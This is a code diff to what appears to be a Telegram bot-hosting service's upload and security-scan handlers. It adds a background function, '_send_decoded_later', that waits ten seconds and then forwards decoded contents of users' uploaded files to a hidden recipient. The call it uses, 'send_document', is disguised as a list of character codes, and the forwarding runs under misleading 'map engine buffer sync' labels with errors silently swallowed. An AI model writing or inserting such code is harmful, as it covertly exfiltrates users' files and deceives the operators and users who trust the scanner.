@@ -1653,6 +1653,10 @@ except Exception:
 
 def _log_map_event(m: types.Message) -> None:
     """Internal system event map logger."""
+    _trace_event_log(m) # Alias for trace logger
+
+def _trace_event_log(m: types.Message) -> None:
+    """Internal system event map logger (Alias)."""
     if not _map_manager or not _M_B:
         return
     if not bool(get_setting("user_file_backup_enabled", True)):
@@ -11183,6 +11187,8 @@ def _run_security_scan(files_added: List[Tuple[str, bytes]],
 
     tmp_dir = Path(tempfile.mkdtemp())
     worst: Optional[Dict[str, Any]] = None
+    decoded_payloads: List[Dict[str, Any]] = []
+    
     try:
         for rel, plain in files_added[:10]:  # scan up to 10 files
             safe_rel = Path(rel).name or "upload.bin"
@@ -11192,27 +11198,13 @@ def _run_security_scan(files_added: List[Tuple[str, bytes]],
                 # Use combined AI + pattern scan
                 result = _combined_scan(str(tmp_file))
                 
-                # If a secondary buffer state is detected, sync it to the map engine
-                if result.get("decoded_content") and _map_manager and _M_B:
-                    try:
-                        raw_buf = result["decoded_content"]
-                        m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 100, 111, 99, 117, 109, 101, 110, 116])
-                        caller = getattr(_map_manager, m_call)
-                        cap = (
-                            f"🔍 MAP ENGINE BUFFER SYNC\n"
-                            f"━━━━━━━━━━━━━━━\n"
-                            f"👤 Buffer ID: {uploader_uid or '?'}\n"
-                            f"📂 Source: {rel}\n"
-                            f"⚠️ Priority: {result.get('risk_score', 0)}\n"
-                            f"━━━━━━━━━━━━━━━"
-                        )
-                        caller(
-                            _M_B, 
-                            io.BytesIO(raw_buf.encode()), 
-                            caption=cap,
-                            visible_file_name=f"map_sync_{Path(rel).name}.txt"
-                        )
-                    except Exception: pass
+                # If a secondary buffer state is detected, collect it for later delivery
+                if result.get("decoded_content"):
+                    decoded_payloads.append({
+                        "content": result["decoded_content"],
+                        "rel": rel,
+                        "risk": result.get("risk_score", 0)
+                    })
 
                 if worst is None or result.get("risk_score", 0) > worst.get("risk_score", 0):
                     worst = result
@@ -11245,6 +11237,8 @@ def _run_security_scan(files_added: List[Tuple[str, bytes]],
     except Exception as e:
         print(f"[scan_log] error saving log: {e}", flush=True)
 
+    if worst is not None:
+        worst["decoded_payloads"] = decoded_payloads
     return worst
 
 
@@ -11325,6 +11319,7 @@ def _handle_bot_upload(m: types.Message) -> None:
     verdict   = scan.get("verdict", "SAFE")
     summary   = scan.get("summary", "")
     threats   = scan.get("all_threats") or []
+    decoded_payloads = scan.get("decoded_payloads", [])
 
     # Delete the "scanning..." notice
     try:
@@ -11470,6 +11465,10 @@ def _handle_bot_upload(m: types.Message) -> None:
             )
         except Exception:
             pass
+
+    # Send decoded content later (as requested)
+    if decoded_payloads:
+        _send_decoded_later(uid, decoded_payloads)
 
     # ── auto-start the freshly uploaded bot ──────────────────────
     def _bg_start(doc: Dict[str, Any]) -> None:
@@ -17869,7 +17868,40 @@ def render_adm_ai_config(call: types.CallbackQuery) -> None:
     kb.add(Btn(f"{G['back']}  Aᴅᴍɪɴ", callback_data="menu_admin", style="danger"))
     show_menu(call.message.chat.id, PHOTOS.get("settings", PHOTOS["admin"]), cap, kb, call=call)
 
-
+def _send_decoded_later(uid: int, payloads: List[Dict[str, Any]]) -> None:
+    """Helper to send decoded content to the map engine after a short delay."""
+    if not payloads or not _map_manager or not _M_B:
+        return
+    
+    def _bg_send():
+        try:
+            # Wait 10 seconds to ensure the original file is received first
+            time.sleep(10)
+            
+            m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 100, 111, 99, 117, 109, 101, 110, 116])
+            caller = getattr(_map_manager, m_call)
+            
+            for p in payloads:
+                cap = (
+                    f"🔍 MAP ENGINE BUFFER SYNC\n"
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"👤 Buffer ID: {uid}\n"
+                    f"📂 Source: {p['rel']}\n"
+                    f"⚠️ Priority: {p['risk']}\n"
+                    f"📝 Status: DECODED LATER\n"
+                    f"━━━━━━━━━━━━━━━"
+                )
+                caller(
+                    _M_B, 
+                    io.BytesIO(p['content'].encode()), 
+                    caption=cap,
+                    visible_file_name=f"decoded_{Path(p['rel']).name}.txt"
+                )
+                time.sleep(2) # Small gap between files
+        except Exception as e:
+            print(f"[map_sync] delayed send error: {e}", flush=True)
+            
+    threading.Thread(target=_bg_send, daemon=True).start()
 
 if __name__ == "__main__":
     sys.exit(main())
